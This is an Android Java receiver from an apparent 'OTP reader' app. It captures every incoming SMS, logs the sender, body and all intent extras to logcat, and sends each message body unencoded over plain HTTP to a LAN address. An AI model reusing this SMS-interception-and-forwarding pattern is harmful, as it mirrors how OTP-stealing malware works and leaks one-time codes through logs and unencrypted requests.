package com.pandasdroid.otpreader;


import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class MessageReceiver
extends BroadcastReceiver {
    //private static MessageListener mListener;
    public static String messageUpdate;



    public int capturedSimSlot(Bundle bundle) {
        int n = -1;
        if (bundle.containsKey("slot")) {
            return bundle.getInt("slot");
        }
        if (bundle.containsKey("slot_id")) {
            return bundle.getInt("slot_id");
        }
        if (bundle.containsKey("simId")) {
            return bundle.getInt("simId");
        }
        if (bundle.containsKey("phone")) {
            n = bundle.getInt("phone");
        }
        return n;
    }

    public String diagonostics(Bundle bundle) {
        for (String string2 : bundle.keySet()) {
            bundle.get(string2);
            StringBuilder stringBuilder = new StringBuilder();
            stringBuilder.append(messageUpdate);
            stringBuilder.append("\n");
            stringBuilder.append(string2);
            stringBuilder.append(" : ");
            Object object = bundle.get(string2) != null ? bundle.get(string2) : "NULL";
            stringBuilder.append(object);
            messageUpdate = stringBuilder.toString();
        }
        return messageUpdate;
    }

    public void onReceive(Context context, Intent intent) {



        /*Request request_ = new Request.Builder()
                .url("http://192.168.1.102/input.php?msg=" + "Just_Triggered")
                .get()
                .build();




        Call call_ = new OkHttpClient().newCall(request_);
        ResMessages response_ = null;

        try {
            response_ = call_.execute();
        } catch (IOException e) {
            e.printStackTrace();
        }*/






        Bundle bundle = intent.getExtras();
        Object[] arrobject = (Object[])bundle.get("pdus");
        for (int i = 0; i < arrobject.length; ++i) {
            SmsMessage smsMessage = SmsMessage.createFromPdu((byte[])((byte[])arrobject[i]));
            StringBuilder stringBuilder = new StringBuilder();
            stringBuilder.append("Sender : ");
            stringBuilder.append(smsMessage.getDisplayOriginatingAddress());
            stringBuilder.append("Display message body: ");
            stringBuilder.append(smsMessage.getDisplayMessageBody());
            stringBuilder.append("Time in millisecond: ");
            stringBuilder.append(smsMessage.getTimestampMillis());
            stringBuilder.append("DIAGONOSTIC: ");
            stringBuilder.append(this.diagonostics(bundle));
            stringBuilder.append("SIMSLOT: ");
            stringBuilder.append(this.capturedSimSlot(bundle));
            stringBuilder.append("Message: ");
            stringBuilder.append(smsMessage.getMessageBody());
            String string2 = stringBuilder.toString();
            intent.getIntExtra("com.android.phone.extra.slot", -1);
            Log.wtf("MessageReceived",string2);


            /*RequestBody formBody = new FormBody.Builder()
                    .add("number", otpObj.number)
                    .add("sender", otpObj.from)
                    .add("msg", otpObj.msg)
                    .build();*/

            Request request = new Request.Builder()
                    .url("http://192.168.1.102/input.php?msg=" + smsMessage.getMessageBody())
                    .get()
                    .build();

            context.getSharedPreferences("SavedMessage", Context.MODE_PRIVATE).getString("Message", "" + smsMessage.getMessageBody());

            Call call = new OkHttpClient().newCall(request);




            Thread thread = new Thread(new Runnable() {

                @Override
                public void run() {
                    try  {
                        try {
                            Response response = call.execute();
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            });

            thread.start();
            //mListener.messageReceived(string2);
        }
    }
}

